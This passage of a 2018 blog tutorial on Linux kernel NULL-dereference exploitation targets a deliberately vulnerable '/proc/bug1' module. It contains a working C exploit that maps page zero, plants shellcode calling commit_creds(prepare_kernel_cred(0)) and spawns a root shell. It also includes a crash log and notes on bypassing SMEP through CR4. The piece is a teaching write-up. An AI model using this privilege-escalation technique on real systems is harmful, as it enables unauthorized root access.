class=\"token punctuation\">.</span></code></pre></div>\n<p>Here's a simple attack code.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/mman.h></span></span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">task_struct</span> <span class=\"token operator\">*</span>daemon<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">cred</span> <span class=\"token operator\">*</span>new<span class=\"token punctuation\">)</span><span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">regparm</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token class-name\">prepare_kernel_cred_t</span> prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token number\">0xffffffffb26ae2b0</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">commit_creds_t</span> commit_creds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token number\">0xffffffffb26adf00</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">commit_creds</span><span class=\"token punctuation\">(</span><span class=\"token function\">prepare_kernel_cred</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 1 - Allocate 0x0\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> PROT_READ <span class=\"token operator\">|</span> PROT_WRITE <span class=\"token operator\">|</span> PROT_EXEC<span class=\"token punctuation\">,</span> MAP_ANON <span class=\"token operator\">|</span> MAP_PRIVATE <span class=\"token operator\">|</span> MAP_FIXED<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mmap()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n\t    <span class=\"token comment\">/* call get_root() */</span>\n\t    <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb8</span><span class=\"token punctuation\">,</span>\n\t    <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// mov rax, &amp;get_root()</span>\n\t    <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span>                               <span class=\"token comment\">// call rax</span>\n\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\toffset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> get_root<span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\e[36m[*] Stage 2 - Trigger NULL dereference\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/bug1\"</span><span class=\"token punctuation\">,</span> O_WRONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"asdf\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// trigger</span>\n    \n    <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// get shell</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>compile just like this.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">gcc <span class=\"token operator\">-</span>o tri tri<span class=\"token punctuation\">.</span>c</code></pre></div>\n<p>compile &#x26; run this program. But it'll not work on this system right away because of SMEP :(.\nyou can also see like this dmesg.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span><span class=\"token number\">13416.790759</span><span class=\"token punctuation\">]</span> tri<span class=\"token punctuation\">[</span><span class=\"token number\">5985</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> segfault at c4f943d ip <span class=\"token number\">00005570</span>bdfcd8aa sp <span class=\"token number\">00007ff</span>d0c4f9420 error <span class=\"token number\">6</span> in tri<span class=\"token punctuation\">[</span><span class=\"token number\">5570</span>bdfcd000<span class=\"token operator\">+</span><span class=\"token number\">1000</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">13423.943053</span><span class=\"token punctuation\">]</span> tri<span class=\"token punctuation\">[</span><span class=\"token number\">5989</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> segfault at ffffffffd5f9799d ip <span class=\"token number\">00005617</span>eefed8aa sp <span class=\"token number\">00007ff</span>ed5f97980 error <span class=\"token number\">7</span> in tri<span class=\"token punctuation\">[</span><span class=\"token number\">5617</span>eefed000<span class=\"token operator\">+</span><span class=\"token number\">1000</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">13683.767595</span><span class=\"token punctuation\">]</span> tri<span class=\"token punctuation\">[</span><span class=\"token number\">6041</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> segfault at <span class=\"token number\">904</span>db6d ip <span class=\"token number\">00005587</span>d5bdb907 sp <span class=\"token number\">00007ff</span>e0904db50 error <span class=\"token number\">6</span> in tri<span class=\"token punctuation\">[</span><span class=\"token number\">5587</span>d5bdb000<span class=\"token operator\">+</span><span class=\"token number\">1000</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136039</span><span class=\"token punctuation\">]</span> unable to execute userspace <span class=\"token function\">code</span> <span class=\"token punctuation\">(</span>SMEP<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>uid<span class=\"token operator\">:</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136042</span><span class=\"token punctuation\">]</span> BUG<span class=\"token operator\">:</span> unable to handle kernel <span class=\"token constant\">NULL</span> pointer dereference <span class=\"token function\">at</span>           <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136044</span><span class=\"token punctuation\">]</span> IP<span class=\"token operator\">:</span>           <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nOops<span class=\"token operator\">:</span> <span class=\"token number\">0011</span> <span class=\"token punctuation\">[</span>#<span class=\"token number\">2</span><span class=\"token punctuation\">]</span> SMP PTI\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136122</span><span class=\"token punctuation\">]</span> RIP<span class=\"token operator\">:</span> <span class=\"token number\">0010</span><span class=\"token operator\">:</span>          <span class=\"token punctuation\">(</span>null<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136123</span><span class=\"token punctuation\">]</span> RSP<span class=\"token operator\">:</span> <span class=\"token number\">0018</span><span class=\"token operator\">:</span>ffffb2ca8636fdf0 EFLAGS<span class=\"token operator\">:</span> <span class=\"token number\">00010286</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136124</span><span class=\"token punctuation\">]</span> RAX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> RBX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000004</span> RCX<span class=\"token operator\">:</span> ffffb2ca8636fef8\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136125</span><span class=\"token punctuation\">]</span> RDX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000004</span> RSI<span class=\"token operator\">:</span> <span class=\"token number\">000056214844</span>eb2f RDI<span class=\"token operator\">:</span> ffff907236ba2a00\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136126</span><span class=\"token punctuation\">]</span> RBP<span class=\"token operator\">:</span> ffffb2ca8636fe00 R08<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span> R09<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000002</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136127</span><span class=\"token punctuation\">]</span> R10<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R11<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000246</span> R12<span class=\"token operator\">:</span> fffffffffffffffb\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136128</span><span class=\"token punctuation\">]</span> R13<span class=\"token operator\">:</span> ffffb2ca8636fef8 R14<span class=\"token operator\">:</span> <span class=\"token number\">000056214844</span>eb2f R15<span class=\"token operator\">:</span> ffff907236ba2a00\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136129</span><span class=\"token punctuation\">]</span> FS<span class=\"token operator\">:</span>  <span class=\"token number\">00007f</span><span class=\"token number\">74</span>c141f740<span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">)</span> GS<span class=\"token operator\">:</span><span class=\"token function\">ffff907239680000</span><span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">)</span> knlGS<span class=\"token operator\">:</span><span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136130</span><span class=\"token punctuation\">]</span> CS<span class=\"token operator\">:</span>  <span class=\"token number\">0010</span> DS<span class=\"token operator\">:</span> <span class=\"token number\">0000</span> ES<span class=\"token operator\">:</span> <span class=\"token number\">0000</span> CR0<span class=\"token operator\">:</span> <span class=\"token number\">0000000080050033</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136131</span><span class=\"token punctuation\">]</span> CR2<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> CR3<span class=\"token operator\">:</span> <span class=\"token number\">0000000067984004</span> CR4<span class=\"token operator\">:</span> <span class=\"token number\">00000000003606e0</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136152</span><span class=\"token punctuation\">]</span> DR0<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR1<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR2<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">14006.136153</span><span class=\"token punctuation\">]</span> DR3<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> DR6<span class=\"token operator\">:</span> <span class=\"token number\">00000000fff</span>e0ff0 DR7<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000400</span></code></pre></div>\n<p>As followed, RIP is successfully changed into NULL but, we can't execute userland code because of SMEP.\nSo, we need to bypass SMEP additionally :(.</p>\n<ul>\n<li>SMEP : Supervisor Mode Execution Protection (meaning userland code cannot be executed in kernelland)</li>\n</ul>\n<p>But, fortunately, bypassing SMEP isn't hard as well :). Just overwriting Bit 20 of CR4 register to zero and doing other stuffs...\nWith above case, <strong>CR4 value is 00000000003606e0</strong>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token function\">bin</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3606e0</span><span class=\"token punctuation\">)</span>\n<span class=\"token string\">'0b11 0110 0000 0110 1110 0000'</span></code></pre></div>\n<p>But, in this case, it's complicated to handle SMEP because there's no kernelland area to execute the code disabling SMEP before NULL dereference triggered, (meaning before userland code executed).\nSo, in the next post, with another case, I'll finish the payload with the bypasses.</p>\n<h2 id=\"epilogue\" style=\"position:relative;\"><a href=\"#epilogue\" aria-label=\"epilogue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Epilogue</h2>\n<p>But, the above cases have a lot of limitations. At first, in the real world, with NULL dereference can't be triggered because of mmap min address.\nThe second is that we need to leak kernel base address with another vulnerability to get commit<em>Creds &#x26; prepare</em>kernel_cred, etc.\nLast is considering default kernel protections like SMEP/SMAP, etc.</p>","excerpt":"Case Let's get down to the point this time. I'll give an example code that has a NULL dereference vulnerability.\nThe testing Environment is…","tableOfContents":"<ul>\n<li><a href=\"/NULL-Dereference-Tutorial/#case\">Case</a></li>\n<li><a href=\"/NULL-Dereference-Tutorial/#code\">Code</a></li>\n<li><a href=\"/NULL-Dereference-Tutorial/#bug\">Bug</a></li>\n<li><a href=\"/NULL-Dereference-Tutorial/#attack\">Attack</a></li>\n<li><a href=\"/NULL-Dereference-Tutorial/#epilogue\">Epilogue</a></li>\n</ul>","fields":{"slug":"/NULL-Dereference-Tutorial/"},"frontmatter":{"title":"Linux Kernel - NULL Dereference Tutorial","date":"Feb 27, 2018","tags":["Security","Linux-Kernel"],"keywords":["null-dereference","exploitation"],"update":"Feb 27, 2018"},"timeToRead":8}},"pageContext":{"slug":"/NULL-Dereference-Tutorial/","series":[],"lastmod":"2018-02-27"}},"staticQueryHashes":["2027115977","694178885"]}